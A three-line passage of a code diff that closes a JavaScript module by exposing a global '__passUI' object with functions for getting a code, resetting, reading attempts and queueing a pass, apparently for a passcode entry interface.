+  window.__passUI = { getCode: () => code, reset, getAttempts, queuePass };
+
+})();
